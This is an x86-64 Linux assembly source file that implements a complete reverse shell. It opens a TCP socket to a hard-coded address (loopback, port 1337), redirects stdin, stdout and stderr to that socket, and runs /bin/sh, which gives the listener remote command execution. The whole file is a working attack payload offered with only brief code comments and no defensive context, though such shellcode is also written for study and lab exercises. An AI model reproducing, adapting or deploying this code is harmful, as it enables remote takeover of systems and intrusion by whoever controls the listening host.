segment .bss
	struc sockaddr	; struct for socket

		sin_family: resw 1	; AF_INET (IPv4)
		sin_port: resw 1	; port
		sin_addr: resd 1	; address

	endstruc
	
segment .rodata
	sockaddr_struct_init:

		istruc sockaddr
			at sin_family, dw 0x2		; AF_INET (IPv4)
			at sin_port, dw 0x3905		; port in little endian
			at sin_addr, dd 0x0100007f	; IP in little endian
		iend

		binsh db "/bin/sh", 0

segment .text
	global _start:

_start:
	mov rax, 41	; syscall for socket
	mov rdi, 2	; AF_INET (IPv4)
	mov rsi, 1	; TCP connexion
	mov rdx, 6	; TCP protocol
	syscall

	push rax	; save the fd
	jmp _connection

_connection:
	mov rax, 42	; syscall for connexion
	pop rdi		; recover the fd
	push rdi
	mov rsi, sockaddr_struct_init
	mov rdx, 0x10	; address lengh
	syscall

	jmp _fd_stdin

_fd_stdin:
        mov     rax, 33
        pop     rdi
        push    rdi
        mov     rsi, 0
        syscall
        jmp     _fd_stdout

_fd_stdout:
        mov     rax, 33
        pop     rdi
        push    rdi
        mov     rsi, 1
        syscall
        jmp _fd_stderr

_fd_stderr:
        mov     rax, 33
        pop     rdi
        push    rdi
        mov     rsi, 2
        syscall
        jmp     _execution



_execution:
	mov rax, 59	; syscall for execve
	mov rdi, binsh	; 
	xor rsi, rsi	; clean the rsi register
	xor rdx, rdx	; clean rdx register
	syscall
